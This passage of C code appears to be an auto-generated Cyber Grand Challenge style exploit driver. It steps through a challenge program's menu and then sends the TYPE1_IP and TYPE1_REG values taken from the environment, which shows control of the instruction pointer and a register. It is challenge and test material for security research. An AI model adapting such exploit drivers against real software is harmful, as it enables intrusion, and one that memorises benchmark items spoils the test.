        static unsigned char match_00036_00000[] = 
            "\x38\x2e\x20\x51\x75\x69\x74\x0a";
        read_00036_ptr += data_match(read_00036 + read_00036_ptr, read_00036_len - read_00036_ptr, match_00036_00000, 8);
        free(read_00036);
        if (read_00036_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00005_00000[] = 
            "\x37\x0a";
        static unsigned int write_00005_00000_len = 2;
        unsigned char *write_00005 = NULL;
        unsigned int write_00005_len = 0;
        write_00005 = append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
        if (write_00005_len > 0) {
            transmit_all(1, write_00005, write_00005_len);
        }
        free(write_00005);
    } while (0);
    do {
        unsigned char *read_00037;
        unsigned int read_00037_len;
        unsigned int read_00037_ptr = 0;
        //**** delimited read
        static unsigned char read_00037_delim[] = 
            "\x0a";
        read_00037 = NULL;
        read_00037_len = 0;
        int read_00037_res = delimited_read(0, &read_00037, &read_00037_len, read_00037_delim, 1);
        if (read_00037_res) {} //silence unused variable warning
        //**** read match data
        static unsigned char match_00037_00000[] = 
            "\x57\x6f\x75\x6c\x64\x6e\x27\x74\x20\x79\x6f\x75\x20\x70\x72\x65"
            "\x66\x65\x72\x20\x61\x20\x6e\x69\x63\x65\x20\x67\x61\x6d\x65\x20"
            "\x6f\x66\x20\x63\x68\x65\x73\x73\x3f\x0a";
        read_00037_ptr += data_match(read_00037 + read_00037_ptr, read_00037_len - read_00037_ptr, match_00037_00000, 42);
        free(read_00037);
        if (read_00037_ptr) {}  //silence unused variable warning if any
    } while (0);
    do {
        unsigned int type1_ip;
        char type1_ip_str[40] = { 0 };
        unsigned char *varbuf;
        size_t varlen;

        varbuf = getenv("TYPE1_IP", &varlen);
        if (varbuf == NULL)
            return -1;

        if (utostr(*(unsigned int *)varbuf, 16, 0, type1_ip_str, sizeof(type1_ip_str)) != 0)
            return -1;

        transmit_all(1, type1_ip_str, strlen(type1_ip_str));
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00007_00000[] = 
            "\x0a";
        static unsigned int write_00007_00000_len = 1;
        unsigned char *write_00007 = NULL;
        unsigned int write_00007_len = 0;
        write_00007 = append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
        if (write_00007_len > 0) {
            transmit_all(1, write_00007, write_00007_len);
        }
        free(write_00007);
    } while (0);
    do {
        unsigned int type1_reg;
        char type1_reg_str[40] = { 0 };
        unsigned char *varbuf;
        size_t varlen;

        varbuf = getenv("TYPE1_REG", &varlen);
        if (varbuf == NULL)
            return -1;

        if (utostr(*(unsigned int *)varbuf, 16, 0, type1_reg_str, sizeof(type1_reg_str)) != 0)
            return -1;

        transmit_all(1, type1_reg_str, strlen(type1_reg_str));
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00009_00000[] = 
            "\x0a";
        static unsigned int write_00009_00000_len = 1;
        unsigned char *write_00009 = NULL;
        unsigned int write_00009_len = 0;
        write_00009 = append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
        if (write_00009_len > 0) {
            transmit_all(1, write_00009, write_00009_len);
        }
        free(write_00009);
    } while (0);
    do {
        //*** writing data
        static unsigned char write_00010_00000[] = 
            "\x38\x0a";
        static unsigned int write_00010_00000_len = 2;
        unsigned char *write_00010 = NULL;
        unsigned int write_00010_len = 0;
        write_00010 = append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
        if (write_00010_len > 0) {
            transmit_all(1, write_00010, write_00010_len);
        }
        free(write_00010);
    } while (0);
}
